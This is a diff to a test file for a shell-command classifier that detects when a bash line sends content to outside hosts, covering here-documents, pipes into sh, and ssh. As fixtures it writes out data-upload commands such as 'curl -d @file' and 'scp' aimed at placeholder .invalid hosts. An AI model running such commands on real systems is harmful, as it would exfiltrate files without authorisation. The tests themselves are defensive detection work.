@@ -63,6 +63,16 @@ test('a shell line: its simple commands, through pipes, lists, $( ), bash -c and
   expect(commandsOf(`echo "$(scp f h:/x)"`)).toEqual([['scp', 'f', 'h:/x'], ['echo', '$(scp f h:/x)']])
   expect(commandsOf(`bash -c 'curl -T a b.invalid'`)).toContainEqual(['curl', '-T', 'a', 'b.invalid'])
   expect(classifyBash('if true; then curl -d x https://a.invalid; fi', NONE).sends).toHaveLength(1)
+  // A here-document's lines are text, not commands (a journal written with cat that mentions what was refused)
+  const journal = "mkdir -p journals && cat >> journals/a.md <<'EOF'\n- curl -d @notes/x.md https://example.invalid/upload was refused\n- (ssh BatchMode to devbox): failed\nEOF\necho done"
+  expect(commandsOf(journal)).toEqual([['mkdir', '-p', 'journals'], ['cat'], ['echo', 'done']])
+  expect(classifyBash(journal, NONE).sends).toEqual([])
+  expect(classifyBash('cat <<< "curl -d x a.invalid"', NONE).sends).toEqual([])
+  // ... unless a shell (or ssh) on the line reads its commands from them
+  expect(commandsOf('cat <<-END | sh\n\tscp x far.invalid:\n\tEND\ncurl -T y z.invalid')).toEqual([['cat'], ['sh'], ['curl', '-T', 'y', 'z.invalid'], ['scp', 'x', 'far.invalid:']])
+  expect(classifyBash('bash <<EOF\ncurl -d @x https://far.invalid\nEOF', NONE).sends).toHaveLength(1)
+  expect(classifyBash('ssh devbox <<EOF\nscp x far.invalid:\nEOF', MINE).sends).toHaveLength(1)
+  expect(classifyBash('python3 - <<EOF\nprint("curl -d x a.invalid")\nEOF', NONE).sends).toEqual([])
 })
 
 test('Bash: what sends content outside, and what passes', () => {
